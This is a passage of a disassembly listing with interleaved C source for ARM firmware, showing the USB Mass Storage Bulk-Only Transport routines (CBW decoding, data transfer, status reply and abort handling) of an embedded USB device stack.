 80092ea:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 80092ec:	68fb      	ldr	r3, [r7, #12]
 80092ee:	2b00      	cmp	r3, #0
 80092f0:	d002      	beq.n	80092f8 <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 80092f2:	68fb      	ldr	r3, [r7, #12]
 80092f4:	2200      	movs	r2, #0
 80092f6:	721a      	strb	r2, [r3, #8]
  }
}
 80092f8:	bf00      	nop
 80092fa:	3714      	adds	r7, #20
 80092fc:	46bd      	mov	sp, r7
 80092fe:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009302:	4770      	bx	lr

08009304 <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009304:	b580      	push	{r7, lr}
 8009306:	b084      	sub	sp, #16
 8009308:	af00      	add	r7, sp, #0
 800930a:	6078      	str	r0, [r7, #4]
 800930c:	460b      	mov	r3, r1
 800930e:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009310:	687b      	ldr	r3, [r7, #4]
 8009312:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009316:	687b      	ldr	r3, [r7, #4]
 8009318:	32b0      	adds	r2, #176	; 0xb0
 800931a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800931e:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009320:	68fb      	ldr	r3, [r7, #12]
 8009322:	2b00      	cmp	r3, #0
 8009324:	d022      	beq.n	800936c <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 8009326:	68fb      	ldr	r3, [r7, #12]
 8009328:	7a1b      	ldrb	r3, [r3, #8]
 800932a:	2b02      	cmp	r3, #2
 800932c:	d005      	beq.n	800933a <MSC_BOT_DataIn+0x36>
 800932e:	2b02      	cmp	r3, #2
 8009330:	db1e      	blt.n	8009370 <MSC_BOT_DataIn+0x6c>
 8009332:	3b03      	subs	r3, #3
 8009334:	2b01      	cmp	r3, #1
 8009336:	d81b      	bhi.n	8009370 <MSC_BOT_DataIn+0x6c>
 8009338:	e013      	b.n	8009362 <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 800933a:	68fb      	ldr	r3, [r7, #12]
 800933c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009340:	7f59      	ldrb	r1, [r3, #29]
 8009342:	68fb      	ldr	r3, [r7, #12]
 8009344:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009348:	331f      	adds	r3, #31
 800934a:	461a      	mov	r2, r3
 800934c:	6878      	ldr	r0, [r7, #4]
 800934e:	f000 f9e5 	bl	800971c <SCSI_ProcessCmd>
 8009352:	4603      	mov	r3, r0
 8009354:	2b00      	cmp	r3, #0
 8009356:	da0d      	bge.n	8009374 <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009358:	2101      	movs	r1, #1
 800935a:	6878      	ldr	r0, [r7, #4]
 800935c:	f000 f920 	bl	80095a0 <MSC_BOT_SendCSW>
      }
      break;
 8009360:	e008      	b.n	8009374 <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009362:	2100      	movs	r1, #0
 8009364:	6878      	ldr	r0, [r7, #4]
 8009366:	f000 f91b 	bl	80095a0 <MSC_BOT_SendCSW>
      break;
 800936a:	e004      	b.n	8009376 <MSC_BOT_DataIn+0x72>
    return;
 800936c:	bf00      	nop
 800936e:	e002      	b.n	8009376 <MSC_BOT_DataIn+0x72>

    default:
      break;
 8009370:	bf00      	nop
 8009372:	e000      	b.n	8009376 <MSC_BOT_DataIn+0x72>
      break;
 8009374:	bf00      	nop
  }
}
 8009376:	3710      	adds	r7, #16
 8009378:	46bd      	mov	sp, r7
 800937a:	bd80      	pop	{r7, pc}

0800937c <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800937c:	b580      	push	{r7, lr}
 800937e:	b084      	sub	sp, #16
 8009380:	af00      	add	r7, sp, #0
 8009382:	6078      	str	r0, [r7, #4]
 8009384:	460b      	mov	r3, r1
 8009386:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009388:	687b      	ldr	r3, [r7, #4]
 800938a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800938e:	687b      	ldr	r3, [r7, #4]
 8009390:	32b0      	adds	r2, #176	; 0xb0
 8009392:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009396:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009398:	68fb      	ldr	r3, [r7, #12]
 800939a:	2b00      	cmp	r3, #0
 800939c:	d01e      	beq.n	80093dc <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 800939e:	68fb      	ldr	r3, [r7, #12]
 80093a0:	7a1b      	ldrb	r3, [r3, #8]
 80093a2:	2b00      	cmp	r3, #0
 80093a4:	d002      	beq.n	80093ac <MSC_BOT_DataOut+0x30>
 80093a6:	2b01      	cmp	r3, #1
 80093a8:	d004      	beq.n	80093b4 <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 80093aa:	e01a      	b.n	80093e2 <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 80093ac:	6878      	ldr	r0, [r7, #4]
 80093ae:	f000 f81b 	bl	80093e8 <MSC_BOT_CBW_Decode>
      break;
 80093b2:	e016      	b.n	80093e2 <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80093b4:	68fb      	ldr	r3, [r7, #12]
 80093b6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093ba:	7f59      	ldrb	r1, [r3, #29]
 80093bc:	68fb      	ldr	r3, [r7, #12]
 80093be:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093c2:	331f      	adds	r3, #31
 80093c4:	461a      	mov	r2, r3
 80093c6:	6878      	ldr	r0, [r7, #4]
 80093c8:	f000 f9a8 	bl	800971c <SCSI_ProcessCmd>
 80093cc:	4603      	mov	r3, r0
 80093ce:	2b00      	cmp	r3, #0
 80093d0:	da06      	bge.n	80093e0 <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80093d2:	2101      	movs	r1, #1
 80093d4:	6878      	ldr	r0, [r7, #4]
 80093d6:	f000 f8e3 	bl	80095a0 <MSC_BOT_SendCSW>
      break;
 80093da:	e001      	b.n	80093e0 <MSC_BOT_DataOut+0x64>
    return;
 80093dc:	bf00      	nop
 80093de:	e000      	b.n	80093e2 <MSC_BOT_DataOut+0x66>
      break;
 80093e0:	bf00      	nop
  }
}
 80093e2:	3710      	adds	r7, #16
 80093e4:	46bd      	mov	sp, r7
 80093e6:	bd80      	pop	{r7, pc}

080093e8 <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 80093e8:	b580      	push	{r7, lr}
 80093ea:	b084      	sub	sp, #16
 80093ec:	af00      	add	r7, sp, #0
 80093ee:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80093f0:	687b      	ldr	r3, [r7, #4]
 80093f2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80093f6:	687b      	ldr	r3, [r7, #4]
 80093f8:	32b0      	adds	r2, #176	; 0xb0
 80093fa:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80093fe:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009400:	68fb      	ldr	r3, [r7, #12]
 8009402:	2b00      	cmp	r3, #0
 8009404:	f000 8085 	beq.w	8009512 <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 8009408:	68fb      	ldr	r3, [r7, #12]
 800940a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800940e:	695b      	ldr	r3, [r3, #20]
 8009410:	68fa      	ldr	r2, [r7, #12]
 8009412:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 8009416:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 8009418:	68fb      	ldr	r3, [r7, #12]
 800941a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800941e:	699b      	ldr	r3, [r3, #24]
 8009420:	68fa      	ldr	r2, [r7, #12]
 8009422:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 8009426:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 8009428:	4b3d      	ldr	r3, [pc, #244]	; (8009520 <MSC_BOT_CBW_Decode+0x138>)
 800942a:	781b      	ldrb	r3, [r3, #0]
 800942c:	4619      	mov	r1, r3
 800942e:	6878      	ldr	r0, [r7, #4]
 8009430:	f003 fd02 	bl	800ce38 <USBD_LL_GetRxDataSize>
 8009434:	4603      	mov	r3, r0
 8009436:	2b1f      	cmp	r3, #31
 8009438:	d118      	bne.n	800946c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 800943a:	68fb      	ldr	r3, [r7, #12]
 800943c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009440:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 8009442:	4a38      	ldr	r2, [pc, #224]	; (8009524 <MSC_BOT_CBW_Decode+0x13c>)
 8009444:	4293      	cmp	r3, r2
 8009446:	d111      	bne.n	800946c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009448:	68fb      	ldr	r3, [r7, #12]
 800944a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800944e:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 8009450:	2b01      	cmp	r3, #1
 8009452:	d80b      	bhi.n	800946c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009454:	68fb      	ldr	r3, [r7, #12]
 8009456:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800945a:	7f9b      	ldrb	r3, [r3, #30]
 800945c:	2b00      	cmp	r3, #0
 800945e:	d005      	beq.n	800946c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 8009460:	68fb      	ldr	r3, [r7, #12]
 8009462:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009466:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009468:	2b10      	cmp	r3, #16
 800946a:	d90f      	bls.n	800948c <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800946c:	68fb      	ldr	r3, [r7, #12]
 800946e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009472:	7f59      	ldrb	r1, [r3, #29]
 8009474:	2320      	movs	r3, #32
 8009476:	2205      	movs	r2, #5
 8009478:	6878      	ldr	r0, [r7, #4]
 800947a:	f000 fe7b 	bl	800a174 <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 800947e:	68fb      	ldr	r3, [r7, #12]
 8009480:	2202      	movs	r2, #2
 8009482:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 8009484:	6878      	ldr	r0, [r7, #4]
 8009486:	f000 f8cb 	bl	8009620 <MSC_BOT_Abort>
 800948a:	e045      	b.n	8009518 <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 800948c:	68fb      	ldr	r3, [r7, #12]
 800948e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009492:	7f59      	ldrb	r1, [r3, #29]
 8009494:	68fb      	ldr	r3, [r7, #12]
 8009496:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800949a:	331f      	adds	r3, #31
 800949c:	461a      	mov	r2, r3
 800949e:	6878      	ldr	r0, [r7, #4]
 80094a0:	f000 f93c 	bl	800971c <SCSI_ProcessCmd>
 80094a4:	4603      	mov	r3, r0
 80094a6:	2b00      	cmp	r3, #0
 80094a8:	da0c      	bge.n	80094c4 <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 80094aa:	68fb      	ldr	r3, [r7, #12]
 80094ac:	7a1b      	ldrb	r3, [r3, #8]
 80094ae:	2b05      	cmp	r3, #5
 80094b0:	d104      	bne.n	80094bc <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80094b2:	2101      	movs	r1, #1
 80094b4:	6878      	ldr	r0, [r7, #4]
 80094b6:	f000 f873 	bl	80095a0 <MSC_BOT_SendCSW>
 80094ba:	e02d      	b.n	8009518 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 80094bc:	6878      	ldr	r0, [r7, #4]
 80094be:	f000 f8af 	bl	8009620 <MSC_BOT_Abort>
 80094c2:	e029      	b.n	8009518 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 80094c4:	68fb      	ldr	r3, [r7, #12]
 80094c6:	7a1b      	ldrb	r3, [r3, #8]
 80094c8:	2b02      	cmp	r3, #2
 80094ca:	d024      	beq.n	8009516 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 80094cc:	68fb      	ldr	r3, [r7, #12]
 80094ce:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 80094d0:	2b01      	cmp	r3, #1
 80094d2:	d020      	beq.n	8009516 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 80094d4:	68fb      	ldr	r3, [r7, #12]
 80094d6:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 80094d8:	2b03      	cmp	r3, #3
 80094da:	d01c      	beq.n	8009516 <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 80094dc:	68fb      	ldr	r3, [r7, #12]
 80094de:	68db      	ldr	r3, [r3, #12]
 80094e0:	2b00      	cmp	r3, #0
 80094e2:	d009      	beq.n	80094f8 <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 80094e4:	68fb      	ldr	r3, [r7, #12]
 80094e6:	f103 0110 	add.w	r1, r3, #16
 80094ea:	68fb      	ldr	r3, [r7, #12]
 80094ec:	68db      	ldr	r3, [r3, #12]
 80094ee:	461a      	mov	r2, r3
 80094f0:	6878      	ldr	r0, [r7, #4]
 80094f2:	f000 f819 	bl	8009528 <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 80094f6:	e00f      	b.n	8009518 <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 80094f8:	68fb      	ldr	r3, [r7, #12]
 80094fa:	68db      	ldr	r3, [r3, #12]
 80094fc:	2b00      	cmp	r3, #0
 80094fe:	d104      	bne.n	800950a <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009500:	2100      	movs	r1, #0
 8009502:	6878      	ldr	r0, [r7, #4]
 8009504:	f000 f84c 	bl	80095a0 <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 8009508:	e006      	b.n	8009518 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 800950a:	6878      	ldr	r0, [r7, #4]
 800950c:	f000 f888 	bl	8009620 <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 8009510:	e002      	b.n	8009518 <MSC_BOT_CBW_Decode+0x130>
    return;
 8009512:	bf00      	nop
 8009514:	e000      	b.n	8009518 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 8009516:	bf00      	nop
    }
  }
}
 8009518:	3710      	adds	r7, #16
 800951a:	46bd      	mov	sp, r7
 800951c:	bd80      	pop	{r7, pc}
 800951e:	bf00      	nop
 8009520:	2000010b 	.word	0x2000010b
 8009524:	43425355 	.word	0x43425355

08009528 <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 8009528:	b580      	push	{r7, lr}
 800952a:	b086      	sub	sp, #24
 800952c:	af00      	add	r7, sp, #0
 800952e:	60f8      	str	r0, [r7, #12]
 8009530:	60b9      	str	r1, [r7, #8]
 8009532:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009534:	68fb      	ldr	r3, [r7, #12]
 8009536:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800953a:	68fb      	ldr	r3, [r7, #12]
 800953c:	32b0      	adds	r2, #176	; 0xb0
 800953e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009542:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009544:	697b      	ldr	r3, [r7, #20]
 8009546:	2b00      	cmp	r3, #0
 8009548:	d023      	beq.n	8009592 <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 800954a:	697b      	ldr	r3, [r7, #20]
 800954c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009550:	699b      	ldr	r3, [r3, #24]
 8009552:	687a      	ldr	r2, [r7, #4]
 8009554:	4293      	cmp	r3, r2
 8009556:	bf28      	it	cs
 8009558:	4613      	movcs	r3, r2
 800955a:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 800955c:	697b      	ldr	r3, [r7, #20]
 800955e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009562:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8009564:	687b      	ldr	r3, [r7, #4]
 8009566:	1ad3      	subs	r3, r2, r3
 8009568:	697a      	ldr	r2, [r7, #20]
 800956a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800956e:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 8009570:	697b      	ldr	r3, [r7, #20]
 8009572:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009576:	2200      	movs	r2, #0
 8009578:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 800957c:	697b      	ldr	r3, [r7, #20]
 800957e:	2204      	movs	r2, #4
 8009580:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 8009582:	4b06      	ldr	r3, [pc, #24]	; (800959c <MSC_BOT_SendData+0x74>)
 8009584:	7819      	ldrb	r1, [r3, #0]
 8009586:	693b      	ldr	r3, [r7, #16]
 8009588:	68ba      	ldr	r2, [r7, #8]
 800958a:	68f8      	ldr	r0, [r7, #12]
 800958c:	f003 fbe4 	bl	800cd58 <USBD_LL_Transmit>
 8009590:	e000      	b.n	8009594 <MSC_BOT_SendData+0x6c>
    return;
 8009592:	bf00      	nop
}
 8009594:	3718      	adds	r7, #24
 8009596:	46bd      	mov	sp, r7
 8009598:	bd80      	pop	{r7, pc}
 800959a:	bf00      	nop
 800959c:	2000010a 	.word	0x2000010a

080095a0 <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 80095a0:	b580      	push	{r7, lr}
 80095a2:	b084      	sub	sp, #16
 80095a4:	af00      	add	r7, sp, #0
 80095a6:	6078      	str	r0, [r7, #4]
 80095a8:	460b      	mov	r3, r1
 80095aa:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80095ac:	687b      	ldr	r3, [r7, #4]
 80095ae:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80095b2:	687b      	ldr	r3, [r7, #4]
 80095b4:	32b0      	adds	r2, #176	; 0xb0
 80095b6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80095ba:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80095bc:	68fb      	ldr	r3, [r7, #12]
 80095be:	2b00      	cmp	r3, #0
 80095c0:	d024      	beq.n	800960c <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 80095c2:	68fb      	ldr	r3, [r7, #12]
 80095c4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095c8:	461a      	mov	r2, r3
 80095ca:	4b12      	ldr	r3, [pc, #72]	; (8009614 <MSC_BOT_SendCSW+0x74>)
 80095cc:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 80095ce:	68fb      	ldr	r3, [r7, #12]
 80095d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095d4:	461a      	mov	r2, r3
 80095d6:	78fb      	ldrb	r3, [r7, #3]
 80095d8:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 80095dc:	68fb      	ldr	r3, [r7, #12]
 80095de:	2200      	movs	r2, #0
 80095e0:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 80095e2:	4b0d      	ldr	r3, [pc, #52]	; (8009618 <MSC_BOT_SendCSW+0x78>)
 80095e4:	7819      	ldrb	r1, [r3, #0]
 80095e6:	68fb      	ldr	r3, [r7, #12]
 80095e8:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 80095ec:	3210      	adds	r2, #16
 80095ee:	230d      	movs	r3, #13
 80095f0:	6878      	ldr	r0, [r7, #4]
 80095f2:	f003 fbb1 	bl	800cd58 <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80095f6:	4b09      	ldr	r3, [pc, #36]	; (800961c <MSC_BOT_SendCSW+0x7c>)
 80095f8:	7819      	ldrb	r1, [r3, #0]
 80095fa:	68fb      	ldr	r3, [r7, #12]
 80095fc:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009600:	3210      	adds	r2, #16
 8009602:	231f      	movs	r3, #31
 8009604:	6878      	ldr	r0, [r7, #4]
 8009606:	f003 fbdf 	bl	800cdc8 <USBD_LL_PrepareReceive>
 800960a:	e000      	b.n	800960e <MSC_BOT_SendCSW+0x6e>
    return;
 800960c:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800960e:	3710      	adds	r7, #16
 8009610:	46bd      	mov	sp, r7
 8009612:	bd80      	pop	{r7, pc}
 8009614:	53425355 	.word	0x53425355
 8009618:	2000010a 	.word	0x2000010a
 800961c:	2000010b 	.word	0x2000010b

08009620 <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 8009620:	b580      	push	{r7, lr}
 8009622:	b084      	sub	sp, #16
 8009624:	af00      	add	r7, sp, #0
 8009626:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009628:	687b      	ldr	r3, [r7, #4]
 800962a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800962e:	687b      	ldr	r3, [r7, #4]
 8009630:	32b0      	adds	r2, #176	; 0xb0
 8009632:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009636:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009638:	68fb      	ldr	r3, [r7, #12]
 800963a:	2b00      	cmp	r3, #0
 800963c:	d02c      	beq.n	8009698 <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 800963e:	68fb      	ldr	r3, [r7, #12]
 8009640:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009644:	7f1b      	ldrb	r3, [r3, #28]
 8009646:	2b00      	cmp	r3, #0
 8009648:	d10f      	bne.n	800966a <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 800964a:	68fb      	ldr	r3, [r7, #12]
 800964c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009650:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 8009652:	2b00      	cmp	r3, #0
 8009654:	d009      	beq.n	800966a <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 8009656:	68fb      	ldr	r3, [r7, #12]
 8009658:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 800965a:	2b00      	cmp	r3, #0
 800965c:	d105      	bne.n	800966a <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800965e:	4b10      	ldr	r3, [pc, #64]	; (80096a0 <MSC_BOT_Abort+0x80>)
 8009660:	781b      	ldrb	r3, [r3, #0]
 8009662:	4619      	mov	r1, r3
 8009664:	6878      	ldr	r0, [r7, #4]
 8009666:	f003 faa7 	bl	800cbb8 <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800966a:	4b0e      	ldr	r3, [pc, #56]	; (80096a4 <MSC_BOT_Abort+0x84>)
 800966c:	781b      	ldrb	r3, [r3, #0]
 800966e:	4619      	mov	r1, r3
 8009670:	6878      	ldr	r0, [r7, #4]
 8009672:	f003 faa1 	bl	800cbb8 <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 8009676:	68fb      	ldr	r3, [r7, #12]
 8009678:	7a5b      	ldrb	r3, [r3, #9]
